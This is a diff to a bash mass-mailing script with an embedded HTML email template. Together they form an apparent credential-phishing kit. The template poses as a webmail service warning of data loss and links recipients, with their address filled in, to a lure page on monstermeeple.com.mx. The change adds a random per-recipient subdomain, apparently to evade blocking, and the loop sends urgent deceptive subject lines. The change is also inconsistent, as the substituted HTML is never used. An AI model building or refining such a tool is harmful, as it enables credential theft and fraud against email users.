@@ -118,7 +118,7 @@ cat > email.html <<EOL
       <p><strong>Note:</strong> If this action is not completed within 24 hours, you may experience service disruption or data loss.</p>
     </div>
     <div class="button-container">
-      <a href="https://web.monstermeeple.com.mx/up/captcha2.html?email={{EMAIL}}" class="cta-button">Update Your Account</a>
+      <a href="https://{{SUBDOMAIN}}.monstermeeple.com.mx/up/captcha2.html?email={{EMAIL}}" class="cta-button">Update Your Account</a>
     </div>
     <div class="footer">
       &copy; 2025 Webmail Services. All rights reserved.<br>
@@ -158,6 +158,12 @@ while IFS= read -r email; do
 
   # Construct the subject with random number
   subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"
+
+    # Generate random 3-letter subdomain
+  subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3)
+  
+  # Replace placeholder in email.html with the random subdomain
+  custom_html=$(sed "s/{{SUBDOMAIN}}/$subdomain/" email.html)
 
   # Read HTML content and replace {{EMAIL}} with the current email address
   html_content=$(sed "s/{{EMAIL}}/$email/g" email.html)
